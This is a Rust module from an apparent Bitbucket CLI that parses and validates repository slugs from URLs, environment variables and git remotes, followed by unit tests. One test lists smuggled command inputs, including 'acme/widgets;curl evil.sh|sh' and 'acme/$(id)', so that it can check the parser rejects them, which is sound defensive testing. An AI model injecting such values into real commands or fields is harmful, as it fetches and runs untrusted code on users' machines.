use crate::error::{BbError, Result};
use crate::git;
use std::fmt;

const MAX_SEGMENT: usize = 100;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RepoSlug {
    pub workspace: String,
    pub repo: String,
}

impl fmt::Display for RepoSlug {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}/{}", self.workspace, self.repo)
    }
}

fn valid_segment(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= MAX_SEGMENT
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        && s != "."
        && s != ".."
}

impl RepoSlug {
    pub fn parse(input: &str) -> Result<Self> {
        let input = input.trim();
        let body = if let Some(rest) = input.strip_prefix("git@bitbucket.org:") {
            rest
        } else if let Some(rest) = input.strip_prefix("https://bitbucket.org/") {
            rest
        } else if let Some(rest) = input.strip_prefix("http://bitbucket.org/") {
            rest
        } else if input.contains("://") || input.contains('@') {
            return Err(BbError::Config(format!(
                "unsupported repository url `{input}` — only bitbucket.org is supported"
            )));
        } else {
            input
        };

        let body = body.trim_end_matches('/');
        let body = body.strip_suffix(".git").unwrap_or(body);

        let mut parts = body.split('/');
        let workspace = parts.next().unwrap_or_default();
        let repo = parts.next().unwrap_or_default();
        if parts.next().is_some() {
            return Err(BbError::Config(format!(
                "expected `workspace/repo`, got `{input}`"
            )));
        }
        if !valid_segment(workspace) || !valid_segment(repo) {
            return Err(BbError::Config(format!(
                "invalid repository `{input}` — expected `workspace/repo`"
            )));
        }

        Ok(RepoSlug {
            workspace: workspace.to_string(),
            repo: repo.to_string(),
        })
    }

    /// Percent-encoded path fragment for use in API urls.
    pub fn path(&self) -> String {
        format!(
            "{}/{}",
            urlencoding::encode(&self.workspace),
            urlencoding::encode(&self.repo)
        )
    }

    pub fn browse_url(&self) -> String {
        format!("https://bitbucket.org/{}/{}", self.workspace, self.repo)
    }
}

pub fn resolve(explicit: Option<&str>) -> Result<RepoSlug> {
    if let Some(value) = explicit {
        return RepoSlug::parse(value);
    }
    if let Ok(value) = std::env::var("BB_REPO") {
        if !value.trim().is_empty() {
            return RepoSlug::parse(&value);
        }
    }
    if !git::in_repo() {
        return Err(BbError::Config(
            "no git repository here — pass `--repo workspace/repo`".into(),
        ));
    }
    // `origin` first, since that is the overwhelmingly common case, then any
    // other configured remote. A clone whose `origin` is a fork or a mirror
    // still resolves as long as some remote points at Bitbucket.
    let mut candidates: Vec<String> = Vec::new();
    if let Ok(url) = git::remote_url("origin") {
        candidates.push(url);
    }
    for name in git::remotes().unwrap_or_default() {
        if name == "origin" {
            continue;
        }
        if let Ok(url) = git::remote_url(&name) {
            candidates.push(url);
        }
    }

    if let Some(slug) = first_bitbucket_slug(candidates.iter().map(String::as_str)) {
        return Ok(slug);
    }

    Err(BbError::Config(if candidates.is_empty() {
        "no git remotes configured — pass `--repo workspace/repo`".into()
    } else {
        format!(
            "no bitbucket.org remote found (checked {}) — pass `--repo workspace/repo`",
            candidates.len()
        )
    }))
}

/// First URL in the sequence that parses as a Bitbucket slug.
fn first_bitbucket_slug<'a>(urls: impl Iterator<Item = &'a str>) -> Option<RepoSlug> {
    urls.filter_map(|url| RepoSlug::parse(url).ok()).next()
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;

    #[test]
    fn first_bitbucket_url_wins_over_earlier_non_bitbucket_remotes() {
        let urls = [
            "https://github.com/someone/fork.git",
            "git@bitbucket.org:acme/widgets.git",
        ];
        let picked = first_bitbucket_slug(urls.iter().copied());
        assert_eq!(
            picked.map(|s| s.to_string()),
            Some("acme/widgets".to_string())
        );
    }

    #[test]
    fn no_bitbucket_remote_yields_none() {
        let urls = ["https://github.com/someone/fork.git"];
        assert!(first_bitbucket_slug(urls.iter().copied()).is_none());
    }

    #[test]
    fn parses_plain_slug() {
        let s = RepoSlug::parse("acme/widgets").unwrap();
        assert_eq!(s.workspace, "acme");
        assert_eq!(s.repo, "widgets");
        assert_eq!(s.to_string(), "acme/widgets");
    }

    #[test]
    fn parses_https_url_with_and_without_git_suffix() {
        assert_eq!(
            RepoSlug::parse("https://bitbucket.org/acme/widgets")
                .unwrap()
                .to_string(),
            "acme/widgets"
        );
        assert_eq!(
            RepoSlug::parse("https://bitbucket.org/acme/widgets.git")
                .unwrap()
                .to_string(),
            "acme/widgets"
        );
    }

    #[test]
    fn parses_ssh_url() {
        assert_eq!(
            RepoSlug::parse("git@bitbucket.org:acme/widgets.git")
                .unwrap()
                .to_string(),
            "acme/widgets"
        );
    }

    #[test]
    fn rejects_shell_metacharacters() {
        for bad in [
            "acme/widgets;curl evil.sh|sh",
            "acme/wid gets",
            "acme/$(id)",
            "a/b/c",
            "acme",
        ] {
            assert!(RepoSlug::parse(bad).is_err(), "must reject {bad:?}");
        }
    }

    #[test]
    fn rejects_non_bitbucket_host() {
        assert!(RepoSlug::parse("https://evil.example.com/acme/widgets").is_err());
    }
}
